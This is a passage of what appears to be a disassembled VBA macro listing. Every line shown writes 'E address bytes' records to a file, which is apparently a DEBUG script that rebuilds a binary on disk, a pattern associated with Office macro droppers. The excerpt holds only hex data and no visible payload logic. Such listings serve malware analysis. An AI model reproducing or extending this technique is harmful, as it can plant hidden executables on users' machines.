' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6290 F6 E9 E9 E9 DF DF DF CD CF CF C1 C2 C6 B6 BA BF"
' 	PrintItemNL 
' Line #1772:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 62A0 00 00 09 A0 AB B9 91 A0 B3 65 77 8E 70 84 9D 68"
' 	PrintItemNL 
' Line #1773:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 62B0 7D 98 65 7A 95 59 6F 88 3B 4C 66 54 69 7F 7C 91"
' 	PrintItemNL 
' Line #1774:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 62C0 A7 80 97 AD 49 60 76 1C 33 49 4D 66 7A 63 7C 90"
' 	PrintItemNL 
' Line #1775:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 62D0 7F 98 AC 7B 94 A8 6F 88 9C 45 5E 72 2F 47 5D 4A"
' 	PrintItemNL 
' Line #1776:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 62E0 62 78 5D 73 8C 5E 74 8D 5D 72 8D 4D 60 7B 4A 58"
' 	PrintItemNL 
' Line #1777:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 62F0 74 6D 7A 94 89 94 AA A2 AC BE C9 D1 DE D9 DE E7"
' 	PrintItemNL 
' Line #1778:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6300 D9 DB E3 E7 E9 F1 CF D1 D9 B9 BD C8 99 9E AD 8D"
' 	PrintItemNL 
' Line #1779:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6310 94 A8 73 7C 97 47 54 74 49 59 7D 6C 7C A1 79 89"
' 	PrintItemNL 
' Line #1780:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6320 AD 74 84 A8 68 7A 9F 5F 71 96 5B 6C 93 5B 6C 93"
' 	PrintItemNL 
' Line #1781:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6330 5A 6A 94 57 67 91 4F 61 8A 50 62 8B 4D 62 88 4D"
' 	PrintItemNL 
' Line #1782:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6340 62 88 4D 62 88 4E 64 88 50 66 8A 52 68 8B 54 66"
' 	PrintItemNL 
' Line #1783:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6350 8B 51 63 88 4C 5D 84 45 56 7D 3F 50 77 3B 4C 73"
' 	PrintItemNL 
' Line #1784:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6360 39 4A 71 39 4A 71 34 46 6B 39 4C 6F 32 45 68 2A"
' 	PrintItemNL 
' Line #1785:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6370 3E 5D 2F 43 62 36 4B 67 46 5B 76 5C 72 8B 2D 42"
' 	PrintItemNL 
' Line #1786:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6380 58 53 66 7B 4E 61 76 49 5D 6F 41 55 67 27 3D 4F"
' 	PrintItemNL 
' Line #1787:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6390 20 36 48 53 6B 7D 76 8E A0 5D 77 88 6D 87 98 5E"
' 	PrintItemNL 
' Line #1788:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 63A0 78 89 47 61 72 61 7B 8B 6F 89 99 67 81 91 44 5C"
' 	PrintItemNL 
' Line #1789:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 63B0 6E 2E 46 58 34 4C 5E 33 4B 5D 22 38 4A 1A 30 42"
' 	PrintItemNL 
' Line #1790:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 63C0 29 40 50 46 5D 6D 6B 7F 90 7A 8F 9E 59 6E 7D 4C"
' 	PrintItemNL 
' Line #1791:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 63D0 61 70 73 86 95 58 6B 7A 67 7A 87 8B 9E AB 9B AE"
' 	PrintItemNL 
' Line #1792:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 63E0 BD 7D 91 A2 2B 41 53 1D 31 42 4D 5B 67 00 00 07"
' 	PrintItemNL 
' Line #1793:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 63F0 00 00 F7 F7 F7 E9 E9 E9 DE DE DE CD CF CF C1 C2"
' 	PrintItemNL 
' Line #1794:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6400 C6 B3 B7 BC 00 00 0A AC B7 C5 A3 B2 C5 74 86 9D"
' 	PrintItemNL 
' Line #1795:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6410 81 95 AE 6C 81 9C 69 7E 99 82 98 B1 4E 5F 79 39"
' 	PrintItemNL 
' Line #1796:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6420 4E 64 60 75 8B 6A 81 97 3D 54 6A 20 37 4D 4D 65"
' 	PrintItemNL 
' Line #1797:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6430 7B 6F 88 9C 85 9E B2 69 82 96 4D 66 7A 2F 48 5C"
' 	PrintItemNL 
' Line #1798:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6440 43 5B 71 66 7E 94 5B 71 8A 48 5E 77 44 59 74 3C"
' 	PrintItemNL 
' Line #1799:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6450 51 6C 4B 5C 77 5E 6D 87 78 85 9B 90 9A AC B9 C1"
' 	PrintItemNL 
' Line #1800:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6460 CE D5 DB E6 D6 D8 E2 DD DF E7 CE D0 DA B1 B5 C0"
' 	PrintItemNL 
' Line #1801:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6470 97 9B AD 7B 84 98 53 5E 79 4B 5A 7A 68 78 9C 6E"
' 	PrintItemNL 
' Line #1802:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6480 80 A5 71 81 A6 6D 7D A2 66 77 9E 62 73 9A 5F 6F"
' 	PrintItemNL 
' Line #1803:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6490 99 5D 6D 97 58 68 92 54 64 8E 54 65 90 56 68 91"
' 	PrintItemNL 
' Line #1804:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 64A0 54 68 91 53 68 8E 4F 64 8A 4D 63 87 4D 63 87 4E"
' 	PrintItemNL 
' Line #1805:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 64B0 64 88 4F 61 86 50 62 87 51 62 89 4E 5F 86 47 58"
' 	PrintItemNL 
' Line #1806:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 64C0 7F 3F 50 77 39 4A 71 35 46 6D 2D 3E 65 3F 51 76"
' 	PrintItemNL 
' Line #1807:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 64D0 33 46 69 23 36 57 2F 43 62 35 4A 66 39 4E 69 4B"
' 	PrintItemNL 
' Line #1808:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 64E0 60 7B 3C 50 69 4C 61 77 4E 63 79 42 5A 6E 23 38"
' 	PrintItemNL 
' Line #1809:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 64F0 4D 19 31 43 2C 44 56 52 6A 7C 71 8B 9C 5B 75 86"
' 	PrintItemNL 
' Line #1810:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6500 6E 88 99 5F 79 89 46 60 70 66 80 90 76 91 9F 67"
' 	PrintItemNL 
' Line #1811:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6510 81 91 3E 56 68 24 3C 4E 2B 43 55 36 4E 60 31 47"
' 	PrintItemNL 
' Line #1812:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6520 59 29 3F 51 2E 45 55 41 58 68 6F 83 94 6E 82 93"
' 	PrintItemNL 
' Line #1813:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6530 55 6A 79 35 4A 59 70 83 92 69 7C 8B 72 85 92 92"
' 	PrintItemNL 
' Line #1814:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6540 A5 B2 90 A3 B2 64 78 89 3D 55 67 57 6E 7E 74 84"
' 	PrintItemNL 
' Line #1815:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6550 90 00 0C 13 00 00 F9 F9 F9 EC EC EC DF DF DF CD"
' 	PrintItemNL 
' Line #1816:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6560 CF CF C1 C2 C6 B1 B5 BA 00 00 09 B0 BB C9 AD BC"
' 	PrintItemNL 
' Line #1817:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6570 CF 86 98 AF 87 9B B4 84 99 B4 60 75 90 76 8C A5"
' 	PrintItemNL 
' Line #1818:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6580 6D 7E 98 43 58 6E 56 6A 83 52 68 81 37 4D 66 2C"
' 	PrintItemNL 
' Line #1819:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6590 43 59 52 69 7F 7F 96 AC 87 9F B3 50 68 7C 39 52"
' 	PrintItemNL 
' Line #1820:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 65A0 66 40 59 6D 63 7B 91 50 68 7E 2F 47 5F 42 5A 72"
' 	PrintItemNL 
' Line #1821:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 65B0 48 5F 79 38 4F 69 4F 63 7C 4A 5C 73 61 70 83 79"
' 	PrintItemNL 
' Line #1822:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 65C0 86 96 9A A3 B1 C2 C8 D3 D0 D2 DC CA CC D6 CE D0"
' 	PrintItemNL 
' Line #1823:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 65D0 DB AA AD BB 8B 92 A3 64 6D 81 4B 58 72 60 72 8F"
' 	PrintItemNL 
' Line #1824:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 65E0 74 87 A8 6E 81 A6 76 87 AE 79 88 AF 78 88 B2 77"
' 	PrintItemNL 
' Line #1825:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 65F0 87 B1 71 81 AC 6A 7A A5 64 74 9F 62 72 9D 5D 6D"
' 	PrintItemNL 
' Line #1826:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6600 9B 60 71 9C 5F 72 9D 5C 70 99 56 6A 93 4F 64 8A"
' 	PrintItemNL 
' Line #1827:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6610 4B 60 86 49 5E 84 4A 5B 82 4C 5D 84 4E 5F 86 4E"
' 	PrintItemNL 
' Line #1828:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6620 5F 86 49 59 83 41 51 7B 38 48 72 32 43 6A 2A 3B"
' 	PrintItemNL 
' Line #1829:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6630 62 36 48 6D 35 48 6B 29 3C 5D 29 3D 5C 36 4B 67"
' 	PrintItemNL 
' Line #1830:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6640 39 4E 69 30 45 60 4F 65 7E 4F 65 7E 51 67 80 45"
' 	PrintItemNL 
' Line #1831:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6650 5D 73 1B 32 48 1E 37 4B 40 59 6D 5F 78 8C 6B 85"
' 	PrintItemNL 
' Line #1832:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6660 96 59 73 84 6B 85 95 5A 75 83 47 62 70 6D 88 96"
' 	PrintItemNL 
' Line #1833:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6670 7A 95 A3 67 81 91 2E 46 58 20 38 4C 2B 43 55 3A"
' 	PrintItemNL 
' Line #1834:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6680 52 64 44 5A 6C 42 58 6A 34 4B 5B 31 48 58 73 87"
' 	PrintItemNL 
' Line #1835:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6690 98 68 7C 8D 59 6E 7D 35 4A 59 6B 7E 8D 80 93 A2"
' 	PrintItemNL 
' Line #1836:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 66A0 8A 9D AC 99 AC BB 86 9B AA 46 5D 6D 57 71 82 8B"
' 	PrintItemNL 
' Line #1837:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 66B0 A4 B4 84 96 A1 00 00 08 00 00 F8 F8 F8 EF EF EF"
' 	PrintItemNL 
' Line #1838:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 66C0 E1 E1 E1 CC CE CE C2 C3 C7 B1 B5 BA 00 00 08 B0"
' 	PrintItemNL 
' Line #1839:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 66D0 BB C9 B9 C8 DB 99 AB C2 80 94 AD B1 C6 E1 88 9D"
' 	PrintItemNL 
' Line #1840:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 66E0 B8 73 89 A2 8A 9B B5 6B 7F 98 66 7B 96 4D 62 7D"
' 	PrintItemNL 
' Line #1841:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 66F0 3C 51 6C 37 4D 66 55 6C 82 89 A0 B6 7D 95 A9 3F"
' 	PrintItemNL 
' Line #1842:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6700 57 6B 38 51 65 63 7C 90 60 78 8E 2D 45 5B 36 4E"
' 	PrintItemNL 
' Line #1843:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6710 66 4C 66 7E 3B 54 6E 40 5A 72 3F 56 6C 32 45 5A"
' 	PrintItemNL 
' Line #1844:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6720 42 53 66 5D 6C 7C 7B 84 92 A9 AF BC C5 C9 D4 C2"
' 	PrintItemNL 
' Line #1845:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6730 C4 CE C7 C9 D4 A7 AA B8 77 7E 8F 53 5E 72 5D 6C"
' 	PrintItemNL 
' Line #1846:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6740 86 70 82 9F 6E 83 A3 76 89 AE 80 90 BA 83 90 BC"
' 	PrintItemNL 
' Line #1847:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6750 84 93 C1 84 93 C1 7F 8E BC 7A 88 B8 7A 88 B8 7E"
' 	PrintItemNL 
' Line #1848:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6760 8C BC 6D 7D AC 6F 7F AD 6D 80 AD 69 7C A7 62 75"
' 	PrintItemNL 
' Line #1849:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6770 A0 58 6C 95 4F 63 8C 4C 5F 85 4A 5B 82 49 5A 81"
' 	PrintItemNL 
' Line #1850:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6780 47 58 7F 46 57 7E 44 54 7E 3F 4F 79 38 48 72 33"
' 	PrintItemNL 
' Line #1851:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6790 43 6D 2B 3C 63 25 37 5C 36 48 6D 33 46 67 1A 2D"
' 	PrintItemNL 
' Line #1852:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 67A0 4E 2A 3E 5D 3F 54 70 2C 41 5C 45 5B 74 50 68 80"
' 	PrintItemNL 
' Line #1853:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 67B0 4A 62 7A 3D 55 6D 20 38 50 20 38 4E 3B 53 69 69"
' 	PrintItemNL 
' Line #1854:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 67C0 82 96 66 80 91 5C 76 86 67 82 90 53 6E 7C 4D 68"
' 	PrintItemNL 
' Line #1855:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 67D0 76 73 8E 9C 76 91 9F 60 7A 8A 28 40 52 23 3B 4F"
' 	PrintItemNL 
' Line #1856:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 67E0 2E 46 58 39 51 63 48 5E 70 4E 64 76 3B 52 62 2A"
' 	PrintItemNL 
' Line #1857:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 67F0 41 51 6C 80 91 5F 73 84 59 6E 7D 48 5D 6C 69 7C"
' 	PrintItemNL 
' Line #1858:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6800 8B 94 A7 B6 98 AB BA 8C 9F AE 56 6B 7A 45 5C 6C"
' 	PrintItemNL 
' Line #1859:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6810 6F 88 9C 80 9A AB 69 7C 89 00 00 08 00 00 F5 F5"
' 	PrintItemNL 
' Line #1860:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6820 F5 EF EF EF E1 E1 E1 CB CD CD C3 C4 C8 B4 B8 BD"
' 	PrintItemNL 
' Line #1861:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6830 00 00 08 AE B9 C7 A7 B6 C9 A2 B4 CB 86 9A B3 B7"
' 	PrintItemNL 
' Line #1862:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6840 CC E7 A2 B7 D2 80 96 AF 7A 8B A5 7E 92 AB 60 75"
' 	PrintItemNL 
' Line #1863:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6850 91 41 57 73 3A 4F 6A 38 4E 67 56 6D 83 86 9D B3"
' 	PrintItemNL 
' Line #1864:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6860 5C 74 88 2A 42 56 4A 63 77 67 80 94 3C 55 69 2C"
' 	PrintItemNL 
' Line #1865:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6870 44 5A 53 6D 85 44 5E 76 27 40 5A 3C 56 6E 31 49"
' 	PrintItemNL 
' Line #1866:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6880 5D 2A 40 52 33 45 56 4C 5B 6B 69 72 80 8F 95 A2"
' 	PrintItemNL 
' Line #1867:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6890 B6 BA C5 C3 C5 D0 B9 BC CA 9F A4 B3 64 6B 7E 5A"
' 	PrintItemNL 
' Line #1868:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 68A0 65 7B 73 83 9A 6D 82 9D 6D 85 A3 7B 91 B4 80 90"
' 	PrintItemNL 
' Line #1869:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 68B0 BB 7F 8C BA 7C 8A BA 7D 8B BB 7D 8B BB 7C 8A BB"
' 	PrintItemNL 
' Line #1870:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 68C0 80 8E BF 86 94 C5 80 8F C0 7F 8E BF 7B 8D BC 76"
' 	PrintItemNL 
' Line #1871:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 68D0 89 B6 6F 82 AF 65 78 A3 5B 6E 99 56 68 91 51 62"
' 	PrintItemNL 
' Line #1872:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 68E0 89 4D 5C 83 48 56 80 46 54 7E 46 54 7E 44 52 7C"
' 	PrintItemNL 
' Line #1873:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 68F0 3D 4B 75 37 45 6F 2E 3D 64 24 34 59 33 43 68 37"
' 	PrintItemNL 
' Line #1874:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6900 48 69 1D 2E 4F 19 2B 4A 33 45 62 3E 53 6E 31 47"
' 	PrintItemNL 
' Line #1875:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6910 60 4C 64 7C 46 5D 77 39 53 6B 24 3E 56 19 34 49"
' 	PrintItemNL 
' Line #1876:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6920 29 44 59 64 7F 93 64 7E 8F 63 7D 8D 67 81 8F 4F"
' 	PrintItemNL 
' Line #1877:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6930 69 77 54 70 7B 77 93 9E 6B 86 94 51 6B 7B 30 48"
' 	PrintItemNL 
' Line #1878:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6940 5A 27 3F 53 36 4E 62 3F 57 6B 45 5B 6D 4E 64 76"
' 	PrintItemNL 
' Line #1879:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6950 41 57 69 2F 45 57 65 79 8A 57 6B 7C 4F 63 74 5A"
' 	PrintItemNL 
' Line #1880:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6960 6E 7F 64 77 86 9A AD BC 90 A3 B2 6E 81 90 41 55"
' 	PrintItemNL 
' Line #1881:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6970 66 6C 83 93 80 9B AF 73 8D 9E 72 85 92 00 07 0F"
' 	PrintItemNL 
' Line #1882:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6980 00 00 F1 F0 F2 EF EF EF E1 E1 E1 CA CC CD C1 C5"
' 	PrintItemNL 
' Line #1883:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6990 C6 B6 BA BF 00 00 07 AC B7 C5 B2 C0 D2 B5 C8 DD"
' 	PrintItemNL 
' Line #1884:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 69A0 95 A9 C2 9A B0 C9 AE C3 DE AC C2 DB 64 79 8F 74"
' 	PrintItemNL 
' Line #1885:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 69B0 88 A1 5F 75 91 40 56 72 39 4E 69 34 4A 63 58 6F"
' 	PrintItemNL 
' Line #1886:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 69C0 85 87 9E B4 4F 67 7B 30 48 5C 65 7C 92 51 69 7F"
' 	PrintItemNL 
' Line #1887:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 69D0 21 39 4F 3A 52 68 4D 65 7D 30 48 60 31 49 61 2A"
' 	PrintItemNL 
' Line #1888:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 69E0 42 58 25 3F 50 29 42 52 27 3B 4C 39 49 5A 53 5D"
' 	PrintItemNL 
' Line #1889:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 69F0 6E 6B 73 80 94 98 A3 AF B3 BE B0 B3 C1 94 9B AA"
' 	PrintItemNL 
' Line #1890:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6A00 59 62 76 67 73 8B 77 88 A2 68 7A 97 7C 90 AF 7F"
' 	PrintItemNL 
' Line #1891:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6A10 92 B5 94 A1 CD 8C 98 C8 84 92 C3 84 92 C3 84 91"
' 	PrintItemNL 
' Line #1892:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6A20 C5 83 90 C4 84 90 C6 87 93 C9 8D 9B CF 8A 98 CC"
' 	PrintItemNL 
' Line #1893:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6A30 85 94 C5 7E 90 BF 78 8A B9 6F 81 B0 65 77 A6 60"
' 	PrintItemNL 
' Line #1894:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6A40 70 9E 56 66 91 51 61 8C 4D 5A 86 4A 5A 85 4C 5C"
' 	PrintItemNL 
' Line #1895:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6A50 86 48 58 82 3F 50 77 36 47 6E 2C 3E 63 2B 3D 62"
' 	PrintItemNL 
' Line #1896:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6A60 29 3C 5F 32 43 64 2A 3C 5B 0E 20 3F 1B 2D 4A 51"
' 	PrintItemNL 
' Line #1897:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6A70 63 80 2C 41 5C 4B 63 7B 4D 66 80 46 60 78 2B 45"
' 	PrintItemNL 
' Line #1898:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6A80 5D 17 32 47 25 40 55 60 7B 8F 65 7F 90 68 82 92"
' 	PrintItemNL 
' Line #1899:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6A90 68 81 91 4D 67 75 59 74 82 79 94 A2 61 7B 8B 45"
' 	PrintItemNL 
' Line #1900:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6AA0 5F 6F 35 4E 62 29 41 55 41 59 6D 50 68 7C 4A 60"
' 	PrintItemNL 
' Line #1901:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6AB0 72 4C 62 74 44 5A 6C 31 47 59 66 7C 8E 55 6C 7C"
' 	PrintItemNL 
' Line #1902:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6AC0 45 5C 6C 63 7A 8A 60 75 84 99 AC BB 84 97 A6 57"
' 	PrintItemNL 
' Line #1903:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6AD0 69 7A 68 7E 90 8A A2 B4 72 8A 9E 6D 83 95 86 99"
' 	PrintItemNL 
' Line #1904:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6AE0 A6 00 03 0C 00 00 F4 F5 F9 EB ED EE D8 DA DB CD"
' 	PrintItemNL 
' Line #1905:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6AF0 CF D0 BD C1 C2 B5 BA BD 00 01 08 BA C3 D0 D9 E8"
' 	PrintItemNL 
' Line #1906:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6B00 F8 CA DB EE 9A AF C5 93 AA C0 9D B5 CD A8 BF D5"
' 	PrintItemNL 
' Line #1907:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 6B10 A4 BB D1 6C 83 99 61 7A 94 34 4D 67 44 5C 74 22"
' 	PrintItemNL 
' Line #1908:
